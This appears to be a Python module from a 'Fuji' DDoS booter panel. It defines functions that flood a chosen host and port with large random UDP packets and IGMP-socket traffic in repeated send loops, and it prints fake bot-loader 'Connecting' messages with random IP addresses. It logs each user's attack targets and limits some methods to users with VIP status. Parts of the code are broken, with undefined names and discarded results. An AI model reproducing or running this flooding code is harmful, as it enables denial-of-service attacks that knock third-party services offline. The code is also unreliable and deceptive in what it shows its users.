import os, sys, time, random, socket
import threading
import urllib



fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0







def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:


		x1 = random.randint(8,255)
		x2 = random.randint(8,255)
		x3 = random.randint(8,255)
		x4 = random.randint(8,255)
		ip = f"{x1}.{x2}.{x3}.{x4}"
		
		a = len(ip)
		b = 15 - a
		air = " "
		x = int(b) * air

		with open("scanner//lists//--loader1", "w") as f:
			f.write(f"[38;2;210;210;210m[Fuji@[38;2;100;255;100mConnecting[38;2;210;210;210m] >> conn->fd:[38;2;100;255;100mTrue![38;2;210;210;210m > [`[38;2;100;255;100m{ip}[38;2;210;210;210m` {x}>> default:default >> arm]")

		with open("scanner//lists//--loader2", "w") as f:
			f.write(f"[38;2;210;210;210m[Fuji@[38;2;100;255;100mConnecting[38;2;210;210;210m] >> conn->fd:[38;2;100;255;100mTrue![38;2;210;210;210m > [`[38;2;100;255;100m{ip}[38;2;210;210;210m` {x}>> default:default >> arm]")



		bots = (random.randint(996,999))
		sock.sendto(punch, (host, int(port)))
		sock.sendto(punch, (host, int(port)))
		sock.sendto(punch, (host, int(port)))
		sock.sendto(punch, (host, int(port)))
		sock.sendto(punch, (host, int(port)))
		sock.sendto(punch, (host, int(port)))
		sock.sendto(punch, (host, int(port)))
		sock.sendto(punch, (host, int(port)))
		sock.sendto(punch, (host, int(port)))
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1
	with open("scanner//lists//--loader1", "w") as f:
		f.write("")
	with open("scanner//lists//--loader2", "w") as f:
		f.write("")






def stdsender(host, timer, port, payload):
	global atks
	global running
	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:

		x1 = random.randint(8,255)
		x2 = random.randint(8,255)
		x3 = random.randint(8,255)
		x4 = random.randint(8,255)
		ip = f"{x1}.{x2}.{x3}.{x4}"
		
		a = len(ip)
		b = 15 - a
		air = " "
		x = int(b) * air

		with open("scanner//lists//--loader1", "w") as f:
			f.write(f"[38;2;210;210;210m[Fuji@[38;2;100;255;100mConnecting[38;2;210;210;210m] >> conn->fd:[38;2;100;255;100mTrue![38;2;210;210;210m > [`[38;2;100;255;100m{ip}[38;2;210;210;210m` {x}>> default:default >> arm]")

		with open("scanner//lists//--loader2", "w") as f:
			f.write(f"[38;2;210;210;210m[Fuji@[38;2;100;255;100mConnecting[38;2;210;210;210m] >> conn->fd:[38;2;100;255;100mTrue![38;2;210;210;210m > [`[38;2;100;255;100m{ip}[38;2;210;210;210m` {x}>> default:default >> arm]")


		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1
	with open("scanner//lists//--loader1", "w") as f:
		f.write("")
	with open("scanner//lists//--loader2", "w") as f:
		f.write("")







with open("branche//databases//user_safe.sql", "r") as f:
	user = f.read()

with open("branche//databases//user_roles.sql", "r") as f:
	text = f.read()

if running <= 1:
	with open("branche//databases//user_safe.sql", "r") as f:
		user_log = f.read()


	with open("branche//logs//attacks//users//{}.sql".format(user_log), "a") as f:
		dates = datetime.datetime.now()

		f.write(f"('Method':'{sinput}', 'Target':'{host}', 'Port':'{port}', 'Attack-Date':'{dates}',)\n")
		f.close() 



	with open(f"branche//logs//attacks//all_attacks.sql", "a") as f:

		dates = datetime.datetime.now()

		f.write(f"('user':'{user_log}', 'Method':'{sinput}', 'Target':'{host}', 'Port':'{port}', 'Attack-Date':'{dates}',)\n")
		f.close() 


	with open("branche//logs//ongoing.sql", "w") as f:
		f.write(f"{sinput} {host} {timer} {port}")
		f.close()




	with open("branding//animations//rocket_attack//run.py") as f:
		exec(f.read())


	host.replace("https://", "")
	host.replace("http://", "")
	host.replace("/", "")




	socket.gethostbyname(host)
	pack = 9192
	punch = random._urandom(int(pack))
	threading.Thread(target=stdsender, args=(host, timer, port, punch)).start()




	os.system("cls")
	print(cooldown_screen)
	main()





else:
	print("You can NOT use this attack method.\nreason: Your vip status is False.\n")
	main()